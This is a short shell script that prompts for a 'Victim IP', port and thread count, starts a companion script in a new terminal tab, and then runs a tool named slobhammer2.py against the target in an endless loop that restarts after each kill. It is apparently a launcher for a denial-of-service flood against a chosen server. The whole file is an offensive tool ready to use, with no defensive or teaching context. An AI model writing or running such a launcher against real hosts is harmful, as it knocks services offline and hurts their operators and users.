echo "Enter Victim IP: "
read IP
echo "Enter Victim Port: "
read port
echo "Enter Amount of Threads: "
read threads
gnome-terminal --tab -e "./slob3.sh"
while [ true ]; do
     ./slobhammer2.py -T -t $IP -p $port -r $threads
     echo ""
     echo ""
     echo ""
     echo "KILLED"
     echo ""
     echo ""
     echo "Restarting..."
     echo ""
     echo ""
     sleep 1
done
